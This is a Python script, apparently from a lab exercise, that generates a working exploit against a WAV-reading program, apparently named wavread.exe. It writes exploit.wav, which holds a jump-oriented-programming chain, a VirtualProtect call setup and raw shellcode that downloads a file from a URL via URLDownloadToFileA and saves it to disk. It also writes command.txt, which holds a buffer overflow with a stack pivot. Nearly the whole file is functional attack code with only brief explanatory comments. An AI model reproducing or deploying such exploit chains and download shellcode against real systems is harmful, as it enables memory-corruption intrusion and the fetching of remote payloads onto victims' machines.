import os
import sys
import struct

"""
This script generates:
  exploit.wav which contains a JOP chain and shellcode
  command.txt which contains a buffer overflow and stack pivot

Usage: python jopwav.py

The shellcode payload is a call to URLDownloadToFileA. It will attempt to access
http://127.0.0.1/test1.tmp and save the contents to pwned.txt. The HTTP endpoint
is left to the user. Suggestion: "python -m SimpleHTTPServer 80" in a directory
with a file called test1.tmp.
"""

"""
This function generates a JOP chain.
Each dispatched jmp to edx is separated by 0xc bytes (0x41414141 padding)
The first gadget moves esp to 0x00435500
The second gadget adds 0x894 (0x00435D94)
The third gadget repeats (0x00436628)
My esp is now pointing to controlled memory
The fourth gadget pops the value from esp into eax. This will be ptr to VirtualProtect()
The fifth gadget jumps to eax (calling VirtualProtect())
"""
def create_jop_chain():
	jop_gadgets = [
            0x41414141, # padding
            0x41414141, # padding
            0x41414141, # padding
            0x004016ed, # pivot esp to 0x00435500
            0x41414141, # padding
            0x41414141, # padding
            0x004015e6, # add 894 to esp (435D94)
            0x41414141, # padding
            0x41414141, # padding
            0x004015e6,  # add 894 to esp (436628)
            0x41414141, # padding
            0x41414141, # padding
            0x00401544, # add eax, edx; pop eax; jmp edx
            0x41414141, # padding
            0x41414141, # padding
            0x0041d6ca, # jmp [eax]
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

header = "RIFF" # must exist
header += struct.pack('<L', 0x01cc45d4)
header += "WAVE" # must exist
header += "fmt "  # must exist
"""
The following 20 bytes will be on the stack and are not validated. Values don't matter and are left over from ROP
"""
header += struct.pack('<L', 0x004135a7)
header += struct.pack('<L', 0x00401677)
header += struct.pack('<L', 0x43434343)
header += struct.pack('<L', 0x0041645b)
header += struct.pack('<L', 0x00040010)
header += "data" # must exist
header += struct.pack('<L', 0x01cc45b0)
# header size = 44
offset = 92
padding = "\x44" * offset
# padding size = 92
jop_chain = create_jop_chain()
# jop_chain size = 80
nops = "\x90" * (1576 - len(header) - len(padding) - len(jop_chain))
# current size: 1656
vp_stack = struct.pack('<L', 0x00427008) # ptr -> virtualprotect()
vp_stack += struct.pack('<L', 0x00436640) # return address
vp_stack += struct.pack('<L', 0x00436000) # lpAddress
vp_stack += struct.pack('<L', 0x000003e8) # dwsize
vp_stack += struct.pack('<L', 0x00000040) # flNewProtect
vp_stack += struct.pack('<L', 0x00433446) # lpflOldProtect
# vp_stack size = 24
payload = "\xBC\xEC\xCD\x18\x00\xE8\x00\x00\x00\x00\x5A\x8D\x52\xF6\x89\xE5\x81\xEC\x00\x10\x00\x00\x52\xBB\x8E\xFE\x1F\x4B\xE8\x6E\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x2A\x01\x00\x00\x8D\xBA\x32\x01\x00\x00\xE8\x8E\x00\x00\x00\x5A\x5D\x55\x52\x31\xC9\x66\xB9\x6F\x6E\x51\x68\x75\x72\x6C\x6D\x54\x8B\x82\x32\x01\x00\x00\xFF\xD0\x83\xC4\x08\x5A\x5D\x52\xBB\x28\x81\x00\x17\xE8\x2F\x00\x00\x00\x5A\x55\x52\x89\xC5\x8D\xB2\x36\x01\x00\x00\x8D\xBA\x3E\x01\x00\x00\xE8\x4F\x00\x00\x00\x5A\x5D\x55\x52\x31\xC9\x51\x51\x8D\xB2\x42\x01\x00\x00\x8D\xBA\x5D\x01\x00\x00\x57\x56\x51\xFF\xD0\xFC\x31\xFF\x64\x8B\x3D\x30\x00\x00\x00\x8B\x7F\x0C\x8B\x7F\x14\x8B\x77\x28\x31\xD2\x66\xAD\x84\xC0\x74\x11\x3C\x41\x72\x06\x3C\x5A\x77\x02\x0C\x20\xC1\xC2\x07\x30\xC2\xEB\xE9\x39\xDA\x8B\x47\x10\x8B\x3F\x75\xDB\xC3\x89\xEA\x03\x52\x3C\x8B\x52\x78\x01\xEA\x8B\x5A\x20\x01\xEB\x31\xC9\x57\x56\x8B\x36\x8B\x3B\x01\xEF\x52\x31\xD2\xC1\xC2\x07\x32\x17\x47\x80\x3F\x00\x75\xF5\x92\x5A\x39\xF0\x74\x0C\x83\xC3\x04\x41\x39\x4A\x18\x75\xDF\x5E\x5F\xC3\x5E\x5F\xAD\x56\x53\x89\xEB\x89\xDE\x03\x5A\x24\x8D\x04\x4B\x0F\xB7\x00\x8D\x04\x86\x03\x42\x1C\x8B\x00\x01\xF0\xAB\x5B\x5E\x83\xC3\x04\x41\x81\x3E\xFF\xFF\x00\x00\x75\xAD\xC3\x26\x80\xAC\xC8\xFF\xFF\x00\x00\x01\x00\x00\x00\x99\x23\x5D\xD9\xFF\xFF\x00\x00\x01\x00\x00\x00\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x37\x2E\x30\x2E\x30\x2E\x31\x2F\x74\x65\x73\x74\x31\x2E\x74\x6D\x70\x00\x70\x77\x6E\x65\x64\x2E\x74\x78\x74\x00"
payload = header + padding + jop_chain + nops  + vp_stack + payload

binary_file = open("exploit.wav", "w") #create and write file
binary_file.write(payload)
binary_file.close()

"""
Size to overwrite RIP: 408
jop_start creates values that get pop'd into edi and edx
  those values then get xor'd with 0x42424242 before jumping to edx
"""

jop_start = struct.pack('<L', 0x42424242)
jop_start += struct.pack('<L', 0x4202577a) # 0x00401538 dispatcher, edi
jop_start += struct.pack('<L', 0x420122ca) # 0x00436088 dispatch table, edx
overflow = "A" * 333
padding = "B" * (408 - len(jop_start) - len(overflow))
new_eip = struct.pack('<L', 0x00401642) # 11   Ops: 13     Mod: wavread.exe
command = overflow + jop_start + padding + new_eip
command_file = open("command.txt", "w")
command_file.write(command)
command_file.close()

